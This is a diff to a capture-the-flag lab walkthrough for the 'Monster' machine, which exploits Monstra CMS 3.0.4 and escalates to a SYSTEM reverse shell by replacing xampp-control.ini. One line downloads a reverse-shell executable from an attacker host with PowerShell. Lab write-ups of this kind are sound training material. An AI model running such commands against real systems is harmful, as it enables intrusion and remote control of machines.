@@ -142,14 +142,6 @@ the exploit did not work? so i had to manually fix it -this doesn’t seem in sc
 **Modified script**
 
 ```python3
-# Exploit Title: Monstra CMS 3.0.4 - Remote Code Execution (RCE)  
-# Date: 05.05.2024  
-# Exploit Author: Ahmet Ümit BAYRAM  
-# Vendor Homepage: <https://monstra.org/>  
-# Software Link: <https://monstra.org/monstra-3.0.4.zip>  
-# Version: 3.0.4  
-# Tested on: MacOS
-
 import requests  
 import random  
 import string  
@@ -305,8 +297,17 @@ iwr -uri http://192.168.45.210:8000/rev1.exe -Outfile rev1.exe
 
 Following the exploit’s PowerShell commands to replace the `xampp-control.ini` configuration file, I successfully obtained a reverse shell as SYSTEM.
 
+![](Images/Monster26.png)
+
 Before running the commands, we started nc on other terminal.
 
 ![](Images/Monster25.png)
 
+**We did the complete process again and on different nc port. Most important thing here is after modifying `xampp-control.ini` file, just check if it is been modified or not by opening it. Do not run the reverse shell or anything. Just start the netcat and wait.**
+
+![](Images/Monster27.png)
+
+Reference Link : 
+
+https://medium.com/@ryanchamruiyang/monster-walkthrough-proving-grounds-by-ryan-cham-e1cda455cfc1
 
